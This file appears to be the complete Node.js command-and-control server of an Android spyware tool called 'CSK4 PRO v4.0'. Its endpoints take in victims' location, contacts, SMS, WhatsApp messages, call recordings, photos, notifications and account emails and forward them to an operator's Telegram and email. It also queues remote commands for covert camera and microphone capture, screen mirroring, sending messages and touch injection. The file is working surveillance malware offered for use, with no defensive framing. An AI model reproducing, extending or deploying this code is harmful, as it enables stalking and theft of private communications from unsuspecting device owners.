// ============================================
// CSK4 PRO v4.0 - Main Server (Standalone)
// ============================================
// Ye file self-contained hai — koi external require nahi
// MongoDB aur Telegram dono inline integrated hain
// ============================================

const express = require('express');
const http = require('http');
const path = require('path');
const cors = require('cors');
const multer = require('multer');
const bodyParser = require('body-parser');
const compression = require('compression');
const helmet = require('helmet');
const { Server } = require('socket.io');
const nodemailer = require('nodemailer');
const fs = require('fs');
require('dotenv').config();

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: '*' },
  maxHttpBufferSize: 2e8,
  pingTimeout: 60000,
  pingInterval: 25000
});

// ============ CONFIG ============
const CONFIG = {
  ADMIN_USER: process.env.ADMIN_USER || 'admin',
  ADMIN_PASS: process.env.ADMIN_PASS || 'csk4@2024',
  DEVICE_TOKEN: process.env.DEVICE_TOKEN || 'CSK4-DEVICE-SECRET-123',
  PORT: process.env.PORT || 4000,
  EMAIL_USER: process.env.EMAIL_USER || '',
  EMAIL_PASS: process.env.EMAIL_PASS || '',
  EMAIL_TO: process.env.EMAIL_TO || '',
  ENABLE_EMAIL: process.env.ENABLE_EMAIL === 'true',
  MONGODB_URI: process.env.MONGODB_URI || '',
  TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN || '',
  TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID || ''
};

// ============================================
// MONGODB (Inline)
// ============================================
let mongoClient = null;
let mongoDb = null;
let mongoConnected = false;

async function mongoConnect() {
  if (!CONFIG.MONGODB_URI) {
    console.log('⚠️ MongoDB URI not set — skipping');
    return false;
  }
  try {
    const { MongoClient } = require('mongodb');
    console.log('🔌 Connecting to MongoDB...');
    mongoClient = new MongoClient(CONFIG.MONGODB_URI, {
      maxPoolSize: 10,
      serverSelectionTimeoutMS: 5000,
      socketTimeoutMS: 45000
    });
    await mongoClient.connect();
    mongoDb = mongoClient.db('csk4');
    await mongoDb.command({ ping: 1 });
    mongoConnected = true;
    console.log('✅ MongoDB connected');
    return true;
  } catch (e) {
    console.error('❌ MongoDB failed:', e.message);
    mongoConnected = false;
    return false;
  }
}

async function mongoSave(collection, data) {
  if (!mongoConnected || !mongoDb) return null;
  try {
    return await mongoDb.collection(collection).insertOne({
      ...data,
      createdAt: new Date()
    });
  } catch (e) {
    console.error(`Mongo save (${collection}):`, e.message);
    return null;
  }
}

async function mongoSaveMany(collection, dataArray) {
  if (!mongoConnected || !mongoDb) return null;
  if (!dataArray || dataArray.length === 0) return { insertedCount: 0 };
  try {
    return await mongoDb.collection(collection).insertMany(
      dataArray.map(item => ({ ...item, createdAt: new Date() }))
    );
  } catch (e) {
    console.error(`Mongo saveMany (${collection}):`, e.message);
    return null;
  }
}

async function mongoUpdate(collection, filter, data) {
  if (!mongoConnected || !mongoDb) return null;
  try {
    return await mongoDb.collection(collection).updateOne(
      filter,
      { $set: { ...data, updatedAt: new Date() }, $setOnInsert: { createdAt: new Date() } },
      { upsert: true }
    );
  } catch (e) {
    console.error(`Mongo update (${collection}):`, e.message);
    return null;
  }
}

async function mongoDelete(collection, filter) {
  if (!mongoConnected || !mongoDb) return null;
  try {
    return await mongoDb.collection(collection).deleteMany(filter);
  } catch (e) {
    console.error(`Mongo delete (${collection}):`, e.message);
    return null;
  }
}

// ============================================
// TELEGRAM (Inline)
// ============================================
let telegramBot = null;
let telegramEnabled = false;

function telegramInit() {
  if (!CONFIG.TELEGRAM_BOT_TOKEN || !CONFIG.TELEGRAM_CHAT_ID) {
    console.log('⚠️ Telegram not configured — skipping');
    return false;
  }
  try {
    const TelegramBot = require('node-telegram-bot-api');
    telegramBot = new TelegramBot(CONFIG.TELEGRAM_BOT_TOKEN, { polling: false });
    telegramEnabled = true;
    console.log('📱 Telegram Bot initialized');
    telegramSend('🟢 <b>CSK4 Server Started</b>\n\nServer is online!');
    return true;
  } catch (e) {
    console.error('❌ Telegram init failed:', e.message);
    telegramEnabled = false;
    return false;
  }
}

async function telegramSend(text) {
  if (!telegramEnabled || !telegramBot) return false;
  try {
    await telegramBot.sendMessage(CONFIG.TELEGRAM_CHAT_ID, text, {
      parse_mode: 'HTML',
      disable_web_page_preview: true
    });
    return true;
  } catch (e) {
    console.error('Telegram send:', e.message);
    return false;
  }
}

function esc(text) {
  if (!text) return '';
  return String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

// ============================================
// EMAIL (Inline)
// ============================================
let transporter = null;
if (CONFIG.ENABLE_EMAIL && CONFIG.EMAIL_USER && CONFIG.EMAIL_PASS) {
  transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: { user: CONFIG.EMAIL_USER, pass: CONFIG.EMAIL_PASS }
  });
  console.log('📧 Email enabled:', CONFIG.EMAIL_USER);
}

let emailCount = 0;
let emailReset = Date.now();

async function sendEmail(subject, body) {
  if (!transporter || !CONFIG.ENABLE_EMAIL) return;
  if (Date.now() - emailReset > 3600000) { emailCount = 0; emailReset = Date.now(); }
  if (emailCount >= 100) return;
  try {
    await transporter.sendMail({
      from: `"CSK4 Server" <${CONFIG.EMAIL_USER}>`,
      to: CONFIG.EMAIL_TO,
      subject, text: body
    });
    emailCount++;
    console.log('📧 Email sent:', subject);
  } catch (e) {
    console.error('Email fail:', e.message);
  }
}

// ============================================
// MIDDLEWARE
// ============================================
app.use(helmet({ contentSecurityPolicy: false }));
app.use(compression());
app.use(cors());
app.use(bodyParser.json({ limit: '200mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '200mb' }));
app.use(express.static(path.join(__dirname, 'public')));
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

if (!fs.existsSync('./uploads')) fs.mkdirSync('./uploads');

// ============ UPLOAD ============
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, './uploads/'),
  filename: (req, file, cb) => {
    const safe = file.originalname.replace(/[^a-zA-Z0-9.]/g, '_');
    cb(null, Date.now() + '-' + safe);
  }
});
const upload = multer({ storage, limits: { fileSize: 200 * 1024 * 1024 } });

// ============ IN-MEMORY CACHE ============
let devices = {};
let locations = [];
let contacts = [];
let files = [];
let photos = [];
let videos = [];
let audioRec = [];
let nearbyDevices = [];
let messages = [];
let commands = [];
let deviceInfo = {};
let callLogs = [];
let installedApps = [];
let screenshots = [];
let bluetoothDevices = [];
let notifications = [];
let whatsappMessages = [];
let activities = [];
let callRecordings = [];
let simInfo = {};
let accountsInfo = {};
let emailsInfo = {};

// ============================================
// INITIALIZE
// ============================================
async function initialize() {
  const mongoOk = await mongoConnect();
  telegramInit();
  console.log('');
  console.log('╔════════════════════════════════════╗');
  console.log('║  CSK4 PRO v4.0 — SYSTEM STATUS     ║');
  console.log('╠════════════════════════════════════╣');
  console.log(`║  MongoDB:   ${mongoOk ? '✅ Connected  ' : '❌ Not connected'}    ║`);
  console.log(`║  Telegram:  ${telegramEnabled ? '✅ Active    ' : '❌ Not active'}    ║`);
  console.log(`║  Email:     ${transporter ? '✅ Enabled   ' : '❌ Disabled'}    ║`);
  console.log('╚════════════════════════════════════╝');
  console.log('');
}

// ============================================
// DEVICE ENDPOINTS
// ============================================

app.post('/api/device/register', async (req, res) => {
  const { deviceId, deviceName, token, model, android, battery } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid token' });
  
  const device = {
    deviceId,
    deviceName: deviceName || 'Unknown',
    model: model || deviceName,
    android: android || 'Unknown',
    battery: battery || 0,
    lastSeen: new Date(),
    online: true,
    ip: req.ip
  };
  
  devices[deviceId] = device;
  await mongoUpdate('devices', { deviceId }, device);
  
  io.emit('device-update', devices);
  console.log(`✅ ${deviceName} (${deviceId})`);
  
  telegramSend(`🟢 <b>Device Online</b>\n\n📱 ${esc(deviceName)}\n🆔 <code>${deviceId}</code>\n📲 ${esc(model)}\n🤖 ${android}\n🔋 ${battery}%`);
  
  res.json({ success: true });
});

app.post('/api/device/heartbeat', async (req, res) => {
  const { deviceId, token, battery } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  if (devices[deviceId]) {
    devices[deviceId].lastSeen = new Date();
    devices[deviceId].online = true;
    if (battery !== undefined) devices[deviceId].battery = battery;
  }
  io.emit('device-update', devices);
  res.json({ success: true });
});

app.post('/api/device/location', async (req, res) => {
  const { deviceId, lat, lng, accuracy, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  
  const entry = { deviceId, lat, lng, accuracy, time: new Date() };
  locations.push(entry);
  if (locations.length > 5000) locations.shift();
  await mongoSave('locations', entry);
  io.emit('new-location', entry);
  
  const deviceName = devices[deviceId]?.deviceName || deviceId;
  telegramSend(`📍 <b>Location</b>\n\n📱 ${esc(deviceName)}\n🗺️ <code>${lat.toFixed(6)}, ${lng.toFixed(6)}</code>\n\n<a href="https://maps.google.com/?q=${lat},${lng}">Open Maps</a>`);
  sendEmail(`📍 Location`, `Device: ${deviceName}\nLat: ${lat}\nLng: ${lng}`);
  
  res.json({ success: true });
});

app.post('/api/device/contacts', async (req, res) => {
  const { deviceId, contacts: list, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  
  contacts = contacts.filter(c => c.deviceId !== deviceId);
  const newContacts = list.map(c => ({ deviceId, name: c.name, phone: c.phone, type: c.type }));
  contacts.push(...newContacts);
  
  await mongoDelete('contacts', { deviceId });
  await mongoSaveMany('contacts', newContacts);
  io.emit('contacts-update', contacts);
  console.log(`👥 Contacts saved: ${list.length}`);
  res.json({ success: true, count: list.length });
});

app.post('/api/device/messages', async (req, res) => {
  const { deviceId, messages: list, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  
  messages = messages.filter(m => m.deviceId !== deviceId);
  const newMessages = list.map(m => ({ deviceId, from: m.from, body: m.body, time: m.time, type: m.type }));
  messages.push(...newMessages);
  
  await mongoDelete('messages', { deviceId });
  await mongoSaveMany('messages', newMessages);
  io.emit('messages-update', messages);
  console.log(`💬 Messages saved: ${list.length}`);
  res.json({ success: true });
});

app.post('/api/device/calllogs', async (req, res) => {
  const { deviceId, callLogs: list, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  
  callLogs = callLogs.filter(c => c.deviceId !== deviceId);
  const newLogs = list.map(c => ({ deviceId, ...c }));
  callLogs.push(...newLogs);
  
  await mongoDelete('callLogs', { deviceId });
  await mongoSaveMany('callLogs', newLogs);
  io.emit('calllogs-update', callLogs);
  res.json({ success: true });
});

app.post('/api/device/apps', async (req, res) => {
  const { deviceId, apps, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  
  installedApps = installedApps.filter(a => a.deviceId !== deviceId);
  const newApps = apps.map(a => ({ deviceId, ...a }));
  installedApps.push(...newApps);
  
  await mongoDelete('apps', { deviceId });
  await mongoSaveMany('apps', newApps);
  io.emit('apps-update', installedApps);
  res.json({ success: true });
});

app.post('/api/device/bluetooth', async (req, res) => {
  const { deviceId, devices: list, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  
  bluetoothDevices = bluetoothDevices.filter(d => d.deviceId !== deviceId);
  const newDevices = list.map(d => ({ deviceId, ...d }));
  bluetoothDevices.push(...newDevices);
  
  await mongoDelete('bluetooth', { deviceId });
  await mongoSaveMany('bluetooth', newDevices);
  io.emit('bluetooth-update', bluetoothDevices);
  res.json({ success: true });
});

app.post('/api/device/info', async (req, res) => {
  const { deviceId, info, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  
  deviceInfo[deviceId] = { ...info, time: new Date() };
  await mongoUpdate('deviceInfo', { deviceId }, { deviceId, ...info });
  io.emit('info-update', deviceInfo);
  res.json({ success: true });
});

app.post('/api/device/notification', async (req, res) => {
  const { deviceId, package: pkg, title, text, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  
  const entry = { deviceId, package: pkg, title, text, time: new Date() };
  notifications.push(entry);
  if (notifications.length > 1000) notifications.shift();
  await mongoSave('notifications', entry);
  io.emit('new-notification', entry);
  
  const deviceName = devices[deviceId]?.deviceName || deviceId;
  telegramSend(`🔔 <b>${esc(title || pkg)}</b>\n\n📱 ${esc(deviceName)}\n📲 ${esc(pkg)}\n📝 ${esc(text)}`);
  res.json({ success: true });
});

app.post('/api/device/whatsapp', async (req, res) => {
  const { deviceId, from, message, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  
  const entry = { deviceId, from, message, time: new Date() };
  whatsappMessages.push(entry);
  if (whatsappMessages.length > 1000) whatsappMessages.shift();
  await mongoSave('whatsapp', entry);
  io.emit('whatsapp-update', whatsappMessages);
  
  const deviceName = devices[deviceId]?.deviceName || deviceId;
  telegramSend(`💬 <b>WhatsApp</b>\n\n📱 ${esc(deviceName)}\n👤 ${esc(from)}\n📝 <i>${esc(message)}</i>`);
  res.json({ success: true });
});

app.post('/api/device/activity', async (req, res) => {
  const { deviceId, type, data, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  
  const entry = { deviceId, type, data, time: new Date() };
  activities.push(entry);
  if (activities.length > 2000) activities.shift();
  await mongoSave('activities', entry);
  io.emit('activity-update', activities);
  res.json({ success: true });
});

app.post('/api/device/callrecording', upload.single('file'), async (req, res) => {
  const { deviceId, number, duration, type, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  if (!req.file) return res.status(400).json({ error: 'No file' });
  
  const entry = {
    deviceId, number, duration, type,
    filename: req.file.filename,
    url: `/uploads/${req.file.filename}`,
    time: new Date()
  };
  callRecordings.push(entry);
  await mongoSave('callRecordings', entry);
  io.emit('callrecording-update', callRecordings);
  
  const deviceName = devices[deviceId]?.deviceName || deviceId;
  telegramSend(`🎙️ <b>Call Recording</b>\n\n📱 ${esc(deviceName)}\n📞 ${esc(number)}\n⏱️ ${duration}s`);
  res.json({ success: true });
});

app.post('/api/device/siminfo', async (req, res) => {
  const { deviceId, sims, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  
  const entry = { deviceId, sims, time: new Date() };
  simInfo[deviceId] = entry;
  await mongoUpdate('simInfo', { deviceId }, entry);
  io.emit('siminfo-update', simInfo);
  
  let text = '';
  if (sims && sims.length > 0) {
    sims.forEach(sim => {
      text += `\n<b>SIM ${sim.slot}:</b>\n  📞 ${sim.number || 'N/A'}\n  📡 ${sim.operator || 'N/A'}`;
    });
  }
  const deviceName = devices[deviceId]?.deviceName || deviceId;
  telegramSend(`📱 <b>SIM Info</b>\n\n📱 ${esc(deviceName)}${text}`);
  res.json({ success: true });
});

app.post('/api/device/accounts', async (req, res) => {
  const { deviceId, accounts, total, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  
  const entry = { deviceId, accounts, total, time: new Date() };
  accountsInfo[deviceId] = entry;
  await mongoUpdate('accounts', { deviceId }, entry);
  io.emit('accounts-update', accountsInfo);
  
  let text = '';
  if (accounts) accounts.forEach(a => { text += `\n📧 ${esc(a.name)}`; });
  const deviceName = devices[deviceId]?.deviceName || deviceId;
  telegramSend(`👤 <b>Accounts</b>\n\n📱 ${esc(deviceName)}\nTotal: ${total}${text}`);
  res.json({ success: true });
});

app.post('/api/device/emails', async (req, res) => {
  const { deviceId, emails, total, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  
  const entry = { deviceId, emails, total, time: new Date() };
  emailsInfo[deviceId] = entry;
  await mongoUpdate('emails', { deviceId }, entry);
  io.emit('emails-update', emailsInfo);
  
  let text = '';
  if (emails) emails.forEach(e => { text += `\n📧 ${esc(e)}`; });
  const deviceName = devices[deviceId]?.deviceName || deviceId;
  telegramSend(`📧 <b>Emails</b>\n\n📱 ${esc(deviceName)}\nTotal: ${total}${text}`);
  res.json({ success: true });
});

app.post('/api/device/upload', upload.single('file'), async (req, res) => {
  const { deviceId, type, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  if (!req.file) return res.status(400).json({ error: 'No file' });
  
  const entry = {
    deviceId,
    type: type || 'file',
    filename: req.file.filename,
    originalName: req.file.originalname,
    url: `/uploads/${req.file.filename}`,
    size: req.file.size,
    time: new Date()
  };
  
  const deviceName = devices[deviceId]?.deviceName || deviceId;
  
  if (type === 'photo') {
    photos.push(entry);
    await mongoSave('photos', entry);
    telegramSend(`📷 <b>Photo</b>\n📱 ${esc(deviceName)}`);
  } else if (type === 'video') {
    videos.push(entry);
    await mongoSave('videos', entry);
    telegramSend(`🎥 <b>Video</b>\n📱 ${esc(deviceName)}`);
  } else if (type === 'audio') {
    audioRec.push(entry);
    await mongoSave('audio', entry);
    telegramSend(`🎤 <b>Audio</b>\n📱 ${esc(deviceName)}`);
  } else if (type === 'screenshot') {
    screenshots.push(entry);
    await mongoSave('screenshots', entry);
    telegramSend(`📸 <b>Screenshot</b>\n📱 ${esc(deviceName)}`);
  } else {
    files.push(entry);
    await mongoSave('files', entry);
  }
  
  io.emit('new-file', entry);
  res.json({ success: true, file: entry });
});

app.get('/api/device/commands/:deviceId', (req, res) => {
  const pending = commands.filter(c => c.deviceId === req.params.deviceId && c.status === 'pending');
  res.json({ commands: pending });
});

app.post('/api/device/command-done', async (req, res) => {
  const { commandId, result } = req.body;
  const cmd = commands.find(c => c.id === commandId);
  if (cmd) {
    cmd.status = 'done';
    cmd.result = result;
    await mongoUpdate('commands', { id: commandId }, { status: 'done', result });
  }
  res.json({ success: true });
});

// ============ ADMIN ENDPOINTS ============

app.post('/api/admin/login', (req, res) => {
  const { username, password } = req.body;
  if (username === CONFIG.ADMIN_USER && password === CONFIG.ADMIN_PASS) {
    res.json({ success: true, token: 'csk4-admin-' + Date.now() });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

app.get('/api/admin/data', async (req, res) => {
  const stats = {
    totalDevices: Object.keys(devices).length,
    onlineDevices: Object.values(devices).filter(d => d.online).length,
    totalPhotos: photos.length,
    totalVideos: videos.length,
    totalFiles: files.length,
    totalContacts: contacts.length,
    totalLocations: locations.length,
    totalMessages: messages.length,
    totalApps: installedApps.length,
    totalBluetooth: bluetoothDevices.length,
    totalScreenshots: screenshots.length,
    totalNotifications: notifications.length,
    totalWhatsapp: whatsappMessages.length,
    totalActivities: activities.length,
    totalCallRecordings: callRecordings.length,
    totalSims: Object.keys(simInfo).length,
    totalAccounts: Object.values(accountsInfo).reduce((s, a) => s + (a.total || 0), 0),
    totalEmails: Object.values(emailsInfo).reduce((s, e) => s + (e.total || 0), 0)
  };
  
  res.json({
    devices, locations, contacts, files, photos, videos,
    audio: audioRec, nearby: nearbyDevices, bluetooth: bluetoothDevices,
    messages, callLogs, apps: installedApps, deviceInfo, commands, screenshots,
    notifications, whatsapp: whatsappMessages, activities, callRecordings,
    simInfo, accounts: accountsInfo, emails: emailsInfo,
    stats
  });
});

app.post('/api/admin/command', async (req, res) => {
  const { deviceId, command, params } = req.body;
  const validCommands = [
    'take_photo_front', 'take_photo_back', 'record_video_front', 'record_video_back',
    'record_audio', 'screenshot', 'lock_screen',
    'get_location', 'get_contacts', 'get_messages', 'get_calllogs',
    'get_files', 'get_apps', 'get_nearby', 'get_bluetooth', 'get_info',
    'get_sim_info', 'get_accounts', 'get_email_accounts',
    'vibrate', 'play_sound', 'flashlight_on', 'flashlight_off',
    'start_webrtc', 'start_audio_stream', 'stop_webrtc', 'switch_camera',
    'start_screen_mirror', 'stop_screen_mirror',
    'open_app', 'uninstall_app', 'force_stop_app',
    'set_brightness', 'set_volume', 'set_ring_mode',
    'send_sms', 'send_whatsapp', 'show_notification',
    'touch_tap', 'touch_swipe', 'touch_back', 'touch_home', 'touch_recent',
    'start_call_recording', 'stop_call_recording'
  ];
  if (!validCommands.includes(command)) return res.status(400).json({ error: 'Invalid command' });
  
  const cmd = {
    id: Date.now().toString() + Math.random().toString(36).substr(2, 5),
    deviceId, command, params: params || {},
    time: new Date(), status: 'pending'
  };
  commands.push(cmd);
  await mongoSave('commands', cmd);
  io.to(deviceId).emit('command', cmd);
  console.log(`🎮 ${command} → ${deviceId}`);
  res.json({ success: true, command: cmd });
});

app.delete('/api/admin/device/:deviceId', async (req, res) => {
  const id = req.params.deviceId;
  delete devices[id];
  delete simInfo[id];
  delete accountsInfo[id];
  delete emailsInfo[id];
  await mongoDelete('devices', { deviceId: id });
  io.emit('device-update', devices);
  res.json({ success: true });
});

// ============ SOCKET.IO ============
io.on('connection', (socket) => {
  console.log('🔌', socket.id);
  socket.on('register-device', (id) => { socket.join(id); });
  socket.on('register-admin', () => { socket.join('admin-room'); });
  socket.on('webrtc-offer', (d) => io.to(d.target).emit('webrtc-offer', d));
  socket.on('webrtc-answer', (d) => io.to(d.target).emit('webrtc-answer', d));
  socket.on('webrtc-ice', (d) => io.to(d.target).emit('webrtc-ice', d));
  socket.on('screen-mirror-offer', (d) => io.to(d.target).emit('screen-mirror-offer', d));
  socket.on('screen-mirror-answer', (d) => io.to(d.target).emit('screen-mirror-answer', d));
  socket.on('screen-mirror-ice', (d) => io.to(d.target).emit('screen-mirror-ice', d));
  socket.on('disconnect', () => {});
});

// ============ START ============
initialize().then(() => {
  server.listen(CONFIG.PORT, '0.0.0.0', () => {
    console.log(`🚀 CSK4 PRO v4.0 running on port ${CONFIG.PORT}`);
  });
});
